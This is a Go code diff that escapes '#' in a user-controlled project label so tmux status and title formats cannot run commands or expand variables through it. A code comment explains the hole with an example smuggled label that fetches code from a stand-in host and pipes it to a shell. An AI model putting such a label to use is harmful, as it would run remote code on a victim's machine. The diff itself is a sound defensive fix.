@@ -215,6 +215,11 @@ func optionsWithNestedReturnBinding(session, projectLabel string, moshiReachable
 	if projectLabel == "" {
 		projectLabel = session
 	}
+	// The label is a directory/project name, i.e. user-controlled, and
+	// status-left and set-titles-string are tmux *formats*: a name like
+	// `x#(curl evil|sh)` would run that shell command on every status
+	// refresh. `##` is tmux's escape for a literal `#`.
+	projectLabel = escapeFormat(projectLabel)
 
 	moshiBadge := ""
 	if moshiReachable {
@@ -479,4 +484,11 @@ var osGetenv = func(name string) string {
 	// Inlined because importing "os" everywhere is fine — this file is
 	// only one of two places that needs it.
 	return getenvImpl(name)
+}
+
+// escapeFormat makes s safe to interpolate into a tmux format string,
+// so `#(…)`, `#{…}` and `#[…]` in it render literally instead of
+// running a command, expanding a variable or restyling the bar.
+func escapeFormat(s string) string {
+	return strings.ReplaceAll(s, "#", "##")
 }
